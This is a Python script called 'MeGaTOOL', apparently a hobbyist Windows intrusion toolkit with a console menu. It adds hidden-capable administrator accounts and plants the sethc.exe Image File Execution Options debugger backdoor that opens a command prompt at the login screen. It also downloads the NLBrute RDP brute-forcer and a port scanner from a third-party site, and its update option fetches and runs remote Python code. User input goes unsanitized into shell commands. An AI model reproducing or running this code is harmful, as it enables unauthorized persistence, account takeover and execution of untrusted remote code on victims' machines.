# <------CoDed By AnonCODER------>
# <------First Version : v1.0------>
# <------Help me improve it :)------>

import subprocess
import urllib.request
from colorama import Fore
from os import system
from time import sleep

print(Fore.RED+'''
####################################################
#                 Version 1.0                      #
#   __  __       ____      _____ ___   ___  _      #
#  |  \/  | ___ / ___| __ |_   _/ _ \ / _ \| |     #
#  | |\/| |/ _ \ |  _ / _` || || | | | | | | |     #
#  | |  | |  __/ |_| | (_| || || |_| | |_| | |___  #
#  |_|  |_|\___|\____|\__,_||_| \___/ \___/|_____| #
#                                                  #
#                                                  # 
#          By AnonC0DER(NoobsFather)               #
####################################################

 --------------------
|  Tel : @AnonCODER  |
 --------------------
''')

#do it again
def again():
    again_v = input(Fore.GREEN+'For Menu type (M) for Exit type (E) : ')
    if again_v.upper() == 'M' or again_v.upper() == 'Menu' or again_v.lower() == 'm' or again_v.lower() == 'menu':
        start()
    elif again_v.upper() == 'E' or again_v.upper() == 'Exit' or again_v.lower() == 'e' or again_v.lower() == 'exit':
        print(Fore.YELLOW+'[-] Good Luck !')
    else:
        print(Fore.RED+'Wrong Value !')
        again()

    
#create username and password
def creat_user():
    user = input(Fore.BLUE+'[+] Enter your Username : ')
    Pass = input(Fore.BLUE+'[+] Enter your Password : ')
    userpass = subprocess.check_output('net user {} {} /add' . format(user,Pass) , shell=True)
    adm = subprocess.check_output('net localgroup administrators {} /add' . format(user) , shell=True) #give administrator to user
    #h_u = user
    #hide_user = system('REG ADD "HKEY_LOCAL_MACHINE/Software/Microsoft/Windows NT/CurrentVersion/Winlogon/SpecialAccounts/Userlist" /v {} /t REG_DWORD /d 0 /f' . format(h_u))
    print(Fore.YELLOW+'~> Done !')  


#change password        
def ch_pass():
    u = input(Fore.BLUE+'[+] Ok, Enter your Username : ')
    p = input(Fore.BLUE+'[+] Now, Enter your new Password : ')
    u_p = subprocess.check_output('net user {} {}' . format(u,p) , shell=True)
    print(Fore.YELLOW+'~> Action completed !') 


#remove user
def remove_user():
    r_u = input(Fore.BLUE+'[-] Enter your Username : ')
    input(Fore.YELLOW+'Are you sure? if yes press Enter... ')
    r_user = subprocess.check_output('net user {} /delete' . format(r_u) , shell=True)
    print(Fore.YELLOW+'~> User was successfully deleted !')


#show all users
def show_users():
    sh_users = system('net user')
    print(Fore.YELLOW+'~> Completed !')


#system info
def sys_info():
    print(Fore.YELLOW+'Wait...')
    sys_i = system('Systeminfo')
    print(Fore.YELLOW+'~> Completed !')


#Task Manager
def taskmgr():
    print(Fore.YELLOW+'Wait...')
    t_open = system('taskmgr')
    print(Fore.YELLOW+'~> Completed !')



#create backdoor
def create_backdoor():
    c_b = input(Fore.BLUE+'[?] Do you wanna create backdoor? (Y > yes , N > no) : ')
    if c_b.upper() == 'Y' or c_b.upper() == 'Yes' or c_b.lower() == 'y' or c_b.lower() == 'yes':
        c_backdoor = subprocess.check_output('REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "C:\windows\system32\cmd.exe')
        print(Fore.YELLOW+'~> Backdoor was successfully added !')   
    elif c_b.upper() == 'N' or c_b.upper() == 'NO' or c_b.lower() == 'n' or c_b.lower() == 'no':
        print(Fore.YELLOW+'[-] Ok,bye.')
        
    else:
        print(Fore.RED+'Wrong Value !')
        again()
            

#remove backdoor
def remove_backdoor():
    r_b = input(Fore.BLUE+'[?] Do you really wanna remove backdoor? (Y > yes , N > no) : ')
    if r_b.upper() == 'Y':
        r_backdoor = subprocess.check_output('REG DELETE "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe"')
        print(Fore.YELLOW+'~> Backdoor was successfully deleted !')
    elif r_b.upper() == 'N':
        print(Fore.YELLOW+'[-] Ok,bye.')


#download NLBrute
def download_NL():
    NL_link = 'https://games.magna-game.site/d/nlbute.rar'
    print(Fore.YELLOW+'[+] Please Waite, Downloading ...')
    urllib.request.urlretrieve(NL_link , 'NLBrute(MeGaTOOL).rar')
    print(Fore.YELLOW+'~> Download completed !')


#download KportScan
def download_KportScan():
    Kp_link = 'https://games.magna-game.site/d/KPortScan%203.0.rar'
    print(Fore.YELLOW+'[+] Please Waite, Downloading...')
    urllib.request.urlretrieve(Kp_link , 'KPortScan(MeGaTOOL).rar')
    print(Fore.YELLOW+'~> Download completed !')


#download chrome
def download_chrom():
    ch_link = 'https://games.magna-game.site/d/ChromeSetup.exe'
    print(Fore.YELLOW+'[+] Please Waite, Downloading...')
    urllib.request.urlretrieve(ch_link , 'GoogleChrome.exe')
    print(Fore.YELLOW+'~> Download completed !')
    

#download cryptotab
def download_cryptotab():
    crypto_link = 'https://cryptobrowser.site/get/BrowserSetup.exe'
    print(Fore.YELLOW+'[+] Please Waite, Downloading...')
    urllib.request.urlretrieve(crypto_link , 'cryptotab.exe')
    print(Fore.YELLOW+'~> Download completed !')


#download winrar
def download_winrar():
    winrar_link = 'https://www.win-rar.com/fileadmin/winrar-versions/winrar/winrar-x64-600.exe'
    print(Fore.YELLOW+'[+] Please Waite, Downloading...')
    urllib.request.urlretrieve(winrar_link , 'winrar.exe')
    print(Fore.YELLOW+'~> Download completed !')

#download IDM
def download_idm():
    idm_link = 'https://download.internetdownloadmanager.com/idman638build18.exe?v=lt&filename=idman638build18.exe'
    print(Fore.YELLOW+'[+] Please Waite, Downloading...')
    urllib.request.urlretrieve(idm_link , 'idm.exe')
    print(Fore.YELLOW+'~> Download completed !')


#download paython 2.7
def download_py2():
    py_link = 'https://www.python.org/ftp/python/2.7.16/python-2.7.16.amd64.msi'
    print(Fore.YELLOW+'[+] Please Waite, Downloading...')
    urllib.request.urlretrieve(py_link , 'python-2.7.16.amd64.msi')
    print(Fore.YELLOW+'~> Download completed !')


#download py3.9
def download_py3():
    py3_link = 'https://www.python.org/ftp/python/3.9.3/python-3.9.3-amd64.exe'
    print(Fore.YELLOW+'[+] Please Waite, Downloading...')
    urllib.request.urlretrieve(py3_link , 'python-3.9.3-amd64.exe')
    print(Fore.YELLOW+'~> Download completed !')


#Update
def update():
    u_MeGaTOOL = 'https://games.magna-game.site/d/MeGaTOOL.py'
    print(Fore.YELLOW+'Please Wait...')
    urllib.request.urlretrieve(u_MeGaTOOL , 'MeGaTOOL(LastV).py')
    print('~> Updated successfully !')
    sleep(1.5)
    system('cls') or system('clear')
    system('python MeGaTOOL(LastV).py')


#About Me && contact Me
def contact():
    print(Fore.GREEN+'''
########################################################  
#   # I'm AnonCODER                                    #
#     # Or NoobsFather                                 #        
#       # My real name is Hesam                        #     
#         # And this my first professional project     #
#         # if you have any idea for this appliction   #
#        # or you wanna talk to me                     #
#       # Contact Me : @NoobsFather                    #
#      # Email : AnonCODER@tutanota.com                #
######################################################## 
    ''')

#StarT
def start():
    a = input(Fore.BLUE+'''
Welcome,
[+] (1) Create new user
[+] (2) Change your password
[+] (3) Remove User
[+] (4) Show All Users
[+] (5) System Info
[+] (6) Task Manager
[+] (7) Create backdoor
[+] (8) Remove backdoor
[+] (9) Download NLBrute
[+] (10) Download KportScan
[+] (11) Download Google Chrom
[+] (12) Download CryptoTab
[+] (13) Download Winrar
[+] (14) Download Internet Download Manager
[+] (15) Download Python 2.7
[+] (16) Download Python 3.9


[*] (1000) About Author && Contact Author
[+] (100) Update
[-] (0) Exit

what do you want to do? : ''')
    
    a = int(a)


    if a == 1:
        creat_user()
        again()

    elif a == 2:
        ch_pass()
        again()

    elif a == 3:
        remove_user()
        again()

    elif a == 4:
        show_users()
        again()

    elif a == 5:
        sys_info()
        again()

    elif a == 6:
        taskmgr()
        again()

    elif a == 7:
        create_backdoor()
        again()

    elif a == 8:
        remove_backdoor()
        again()

    elif a == 9:
        download_NL()
        again()

    elif a == 10:
        download_KportScan()
        again()
        
    elif a == 11:
        download_chrom()
        again()
        
    elif a == 12:
        download_cryptotab()
        again()
        
    elif a == 13:
        download_winrar()
        again()
        
    elif a == 14:
        download_idm()
        again()

    elif a == 15:
        download_py2()
        again()

    elif a == 16:
        download_py3()
        again()     

    elif a == 1000:
        contact()
        again()

    elif a == 100:
        update()

    elif a == 0:
        print(Fore.YELLOW+'~> Se you Later !')
        
    else:
        print(Fore.RED+'Wrong Value !')
        again()


start()

# <------CoDed By AnonCODER------>
# <------First Version : v1.0------>
# <------Help me improve it :)------>